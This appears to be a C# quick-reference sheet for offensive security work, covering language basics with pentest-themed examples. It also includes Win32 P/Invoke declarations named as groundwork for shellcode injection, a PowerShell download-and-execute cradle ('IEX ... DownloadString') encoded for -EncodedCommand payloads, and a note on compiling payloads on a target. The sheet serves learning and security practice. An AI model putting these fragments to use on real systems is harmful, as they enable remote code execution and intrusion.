Shortcuts

```bash
dotnet new console -o ToolName   # scaffold a new console project
dotnet build                     # compile
dotnet run                       # build + run
dotnet publish -c Release -r win-x64 --self-contained  # standalone EXE
csc.exe payload.cs               # compile a single file (legacy, in-place on target)
```

Common Imports (using directives)

```csharp
using System;                       // Core types (Console, String, etc.)
using System.IO;                    // File/stream interaction
using System.Net;                   // WebClient, IPAddress
using System.Net.Http;              // HttpClient — Web exploitation/APIs
using System.Net.Sockets;           // TcpClient — low-level networking
using System.Diagnostics;           // Process — running system commands
using System.Text;                  // Encoding (Base64, UTF8)
using System.Collections.Generic;   // List<T>, Dictionary<K,V>, HashSet<T>
using System.Linq;                  // Where/Select/etc. pipeline filtering
using System.Threading.Tasks;       // async/await
using System.Runtime.InteropServices; // DllImport (P/Invoke — Win32 APIs)
```

Variables and Typing

```csharp
// Basic types (statically typed)
string name = "jell0man";    // String
int count = 10;              // Integer (32-bit)
double pi = 3.14;            // Double (use float for 32-bit, decimal for money)
bool isActive = true;        // Boolean

// 'var' lets the compiler infer the type (still static, not dynamic)
var target = "10.10.10.1";   // inferred as string

// Type Casting
string stringNum = 100.ToString();
int integerVal = int.Parse("50");
int.TryParse("50", out int safeVal);  // safe — no exception on bad input

// String Interpolation ($ prefix — best for output/logging)
Console.WriteLine($"User: {name} | Active: {isActive}");
```

Computing and Comparisons

```csharp
// Arithmetic
double result = 10.0 / 3;    // 3.33 (float division — needs a float operand)
int floorDiv = 10 / 3;       // 3 (integer division truncates)
int remainder = 10 % 3;      // 1 (Modulo)
double power = Math.Pow(2, 3); // 8

// Comparisons / Operators
// ==, !=, >, <, >=, <=   &&  (and)   ||  (or)   !  (not)
if (name == "root" || isActive) {
    Console.WriteLine("Access Granted");
}

// Membership testing
string[] roles = { "admin", "root", "operator" };
if (roles.Contains("root")) {     // requires System.Linq
    Console.WriteLine("Found");
}
```

Command Line Arguments

```csharp
// args is passed into Main automatically (string[])
class Program {
    static void Main(string[] args) {
        if (args.Length < 1) {
            Console.WriteLine("Usage: ToolName.exe <target_ip>");
            Environment.Exit(1);
        }
        string target = args[0];   // args[0] is the FIRST arg (not the exe name)
    }
}
```

Functions (Methods)

```csharp
// Signature: accessModifier returnType Name(params)
static string PwnCheck(string target, int port = 80) {
    if (target == "127.0.0.1") {
        return "Localhost skipped";
    }
    return $"Scanning {target} on {port}...";
}

// Calling (named args optional but readable)
string msg = PwnCheck("10.10.10.1", port: 443);

// 'out' params — return extra values without a tuple/object
static bool TryConnect(string ip, out string status) {
    status = "connected";
    return true;
}

// Tuples — multiple return values (Go-style)
static (string ip, string err) ScanTarget() {
    return ("192.168.1.5", null);
}
var (ip, err) = ScanTarget();
```

Loops

```csharp
// Range loop
for (int i = 0; i < 5; i++) {
    Console.WriteLine($"Attempt {i}");
}

// Collection loop (foreach)
string[] targets = { "10.0.0.1", "10.0.0.2" };
foreach (string ip in targets) {
    Console.WriteLine($"Pinging {ip}");
}

// While loop
int count = 0;
while (count < 3) {
    Console.WriteLine("Checking...");
    count++;
}
```

Lists (Arrays and List)

```csharp
// Fixed-size array
string[] ipsArr = { "127.0.0.1", "192.168.1.1" };
string firstIp = ipsArr[0];           // Access

// List<T> — dynamic, resizable (the workhorse)
List<string> ips = new List<string> { "127.0.0.1", "192.168.1.1" };
ips.Add("10.10.10.10");               // Add to end
ips.RemoveAt(ips.Count - 1);          // Remove last item
var subset = ips.GetRange(0, 2);      // Slice (start, count)
```

Dictionaries

```csharp
// Creation
var userData = new Dictionary<string, object> {
    { "username", "jell0man" },
    { "uid", 1000 }
};

// Access/Update
Console.WriteLine(userData["username"]);
userData["shell"] = "/bin/zsh";

// Safe access (prevents KeyNotFoundException)
if (userData.TryGetValue("shell", out var shell)) {
    Console.WriteLine(shell);
}
```

Sets (HashSet)

```csharp
// Unique and unordered — perfect for deduping discovered hosts
var discoveredHosts = new HashSet<string> { "10.0.0.1", "10.0.0.2", "10.0.0.1" };
// Result: { "10.0.0.1", "10.0.0.2" }

discoveredHosts.Add("10.0.0.5");   // returns false if already present
```

Errors and Exceptions

```csharp
try {
    string data = File.ReadAllText("targets.txt");
}
catch (FileNotFoundException) {
    Console.WriteLine("[-] Error: targets.txt not found.");
}
catch (Exception e) {
    // e.Message holds the error text
    Console.WriteLine($"[-] An unexpected error occurred: {e.Message}");
}
finally {
    Console.WriteLine("[*] Script cleanup finished.");
}
```

Classes and Initialization

```csharp
class Target {
    // Properties (auto-implemented getters/setters)
    public string IP { get; set; }
    public string Hostname { get; set; }
    private string _secretKey;        // Private field — internal use only

    // Constructor
    public Target(string ip, string hostname = "Unknown") {
        IP = ip;
        Hostname = hostname;
    }

    public void Display() {
        Console.WriteLine($"Target: {Hostname} ({IP})");
    }
}

// Usage
Target machine = new Target("10.10.10.5", "DC01");
machine.Display();
```

Inheritance

```csharp
class Scanner {
    // 'virtual' allows child classes to override
    public virtual void Run() {
        Console.WriteLine("Starting generic scan...");
    }
}

class PortScanner : Scanner {            // Inherit with the colon
    public override void Run() {         // 'override' replaces parent method
        Console.WriteLine("Starting Nmap port scan...");
    }
}

class WebScanner : Scanner {
    public override void Run() {
        Console.WriteLine("Starting Directory Bruteforce...");
    }
}

// Polymorphism in action
List<Scanner> tools = new List<Scanner> { new PortScanner(), new WebScanner() };
foreach (Scanner tool in tools) {
    tool.Run();
}
```

LINQ (Pipeline Filtering)

```csharp
// LINQ is C#'s pipeline for filtering/transforming collections.
// Method syntax (most common):
var liveHosts = hosts.Where(h => h.IsUp)              // filter
                     .Select(h => h.IP)              // project
                     .OrderBy(ip => ip)              // sort
                     .ToList();                      // materialize

// Quick aggregates
int openCount = ports.Count(p => p.State == "open");
bool anyAdmin = users.Any(u => u.IsAdmin);
```

Async / Await

```csharp
// HttpClient is the modern way to hit web targets. Reuse a single instance.
static readonly HttpClient client = new HttpClient();

static async Task<string> FetchAsync(string url) {
    HttpResponseMessage resp = await client.GetAsync(url);
    return await resp.Content.ReadAsStringAsync();
}

// Calling from an async Main
static async Task Main(string[] args) {
    string body = await FetchAsync("http://10.10.10.1/robots.txt");
    Console.WriteLine(body);
}
```

P/Invoke (Calling Win32 APIs)

```csharp
// DllImport bridges into native Windows APIs — core of offensive C# tradecraft
// (shellcode injection, token manipulation, etc.).
using System.Runtime.InteropServices;

class Native {
    [DllImport("kernel32.dll")]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
}

// Common constants:
// MEM_COMMIT = 0x1000 | MEM_RESERVE = 0x2000
// PAGE_EXECUTE_READWRITE = 0x40
```

Running System Commands

```csharp
// Shell out to native tools (nmap, whoami, etc.)
var psi = new ProcessStartInfo {
    FileName = "cmd.exe",
    Arguments = "/c whoami /all",
    RedirectStandardOutput = true,
    UseShellExecute = false,
    CreateNoWindow = true
};

using (Process proc = Process.Start(psi)) {
    string output = proc.StandardOutput.ReadToEnd();
    proc.WaitForExit();
    Console.WriteLine(output);
}
```

Base64 / Encoding

```csharp
// Encode (e.g. for -EncodedCommand PowerShell payloads — uses UTF-16LE/Unicode)
string cmd = "IEX(New-Object Net.WebClient).DownloadString('http://...')";
string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(cmd));

// Decode
byte[] raw = Convert.FromBase64String(b64);
string decoded = Encoding.UTF8.GetString(raw);
```